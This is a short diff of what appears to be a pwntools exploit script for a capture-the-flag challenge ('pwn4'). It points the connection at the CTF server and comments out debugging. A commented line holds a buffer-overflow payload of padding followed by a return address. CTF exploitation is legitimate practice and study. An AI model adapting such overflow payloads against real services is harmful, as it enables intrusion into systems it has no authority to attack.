@@ -9,10 +9,10 @@ gdb_cmd = [
     "c"
 ]
 
-#p  = remote("pwn.ctf.tamu.edu",4324)
-p = process("./pwn4")
+p  = remote('pwn.ctf.tamu.edu',4324)
+#p = process("./pwn4")
 
-gdb.attach(p, gdbscript = "\n".join(gdb_cmd))
+#gdb.attach(p, gdbscript = "\n".join(gdb_cmd))
 
 
 #(python -c 'print "A"*23+ "\x11\xba\x07\xf0"')
